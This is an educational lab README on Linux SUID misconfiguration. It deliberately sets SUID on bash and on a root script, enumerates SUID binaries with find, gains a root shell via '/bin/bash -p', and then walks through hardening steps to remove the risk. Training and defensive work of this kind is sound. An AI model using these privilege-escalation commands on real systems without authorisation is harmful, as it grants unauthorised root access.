# ⚠️ Linux Security: SUID Exploitation & Hardening

This repository demonstrates **SUID misconfigurations** in Linux, focusing on **privilege escalation techniques** and **security hardening** strategies. 🚀

---

## 🎯 Project Scope
This guide will help you:
- 🔍 **Identify SUID vulnerabilities**
- 🛠 **Exploit misconfigured SUID binaries for privilege escalation**
- 🔐 **Implement security measures to mitigate risks**

---

## 🔥 Step 1: Setup - Creating a Vulnerable SUID Environment

### 🛑 **1️⃣ Set SUID Bit on Bash (Risky!)**
```bash
# Grant SUID to Bash (VERY DANGEROUS)
┌──(kali㉿kali)-[~]
└─$ sudo chmod u+s /bin/bash

# Verify SUID is set
┌──(kali㉿kali)-[~]
└─$ ls -l /bin/bash  
-rwsr-xr-x 1 root root 1298416 Oct 20 16:49 /bin/bash
```

### 📝 **2️⃣ Create a Root-Owned SUID Script**
```bash
# Create a script with root ownership
┌──(kali㉿kali)-[~]
└─$ sudo nano /root/root_script.sh

# Paste the following inside nano:
#!/bin/bash
echo "Running as: $(whoami)"
id

# Save & exit, then make it executable
┌──(kali㉿kali)-[~]
└─$ sudo chmod 4755 /root/root_script.sh

# Verify SUID permissions
┌──(kali㉿kali)-[~]
└─$ ls -l /root/root_script.sh     
-rwsr-xr-x 1 root root 44 Mar 19 18:30 /root/root_script.sh
```

---

## 🚀 Step 2: Exploiting SUID to Gain Root Access

### 🔎 **3️⃣ Finding Vulnerable SUID Binaries**
```bash
# Search for all SUID binaries
┌──(kali㉿kali)-[~]
└─$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/chromium/chrome-sandbox
/usr/lib/openssh/ssh-keysign
... (more results)
```

### 🛠 **4️⃣ Exploit SUID on Bash to Escalate Privileges**
```bash
# Run Bash with SUID privilege
┌──(kali㉿kali)-[~]
└─$ /bin/bash -p

# Verify if we have root access
bash-5.2# whoami
root

# Execute root-owned script
bash-5.2# /root/root_script.sh
Running as: root
uid=0(root) gid=0(root) groups=0(root)
```

---

## 🔐 Step 3: Mitigating SUID Vulnerabilities

### ❌ **5️⃣ Remove SUID from Bash**
```bash
# Remove the SUID bit from Bash
bash-5.2# sudo chmod -s /bin/bash

# Verify SUID is removed
bash-5.2# ls -l /bin/bash
-rwxr-xr-x 1 root root 1298416 Oct 20 16:49 /bin/bash
```

### 🔒 **6️⃣ Secure SUID Scripts**
```bash
# Restrict access to root-owned scripts
bash-5.2# sudo chown root:root /root/root_script.sh
bash-5.2# sudo chmod 700 /root/root_script.sh

# Verify secure permissions
bash-5.2# ls -l /root/root_script.sh
-rwx------ 1 root root 44 Mar 19 18:30 /root/root_script.sh
```

---

## 📌 Task 4 - Summary Table

| **Step**  | **Action** | **Command/Details** |
|-----------|--------------------------------|-----------------------------|
| 🛠 **Setup** | Set SUID on Bash (insecure) | `sudo chmod u+s /bin/bash` |
| | Create a root-owned script | `nano /root/root_script.sh` |
| | Set SUID on the script | `sudo chmod 4755 /root/root_script.sh` |
| | Verify permissions | `ls -l /bin/bash /root/root_script.sh` |
| 🚀 **Exploitation** | Find SUID binaries | `find / -perm -4000 2>/dev/null` |
| | Exploit SUID Bash | `/bin/bash -p` |
| | Verify root access | `whoami` |
| | Execute root-owned script | `/root/root_script.sh` |
| 🔐 **Mitigation** | Remove SUID from Bash | `sudo chmod -s /bin/bash` |
| | Restrict script execution to root | `sudo chmod 700 /root/root_script.sh` |
| | Verify permissions after mitigation | `ls -l /bin/bash /root/root_script.sh` |

---

### 🛡️ **Final Thoughts**
✅ **Understanding SUID vulnerabilities is crucial for both ethical hacking and system security. Always audit your system to prevent privilege escalation attacks!**

🚀 Stay Secure! 🔒


--------------------------------------------THE END ----------------------------------------------
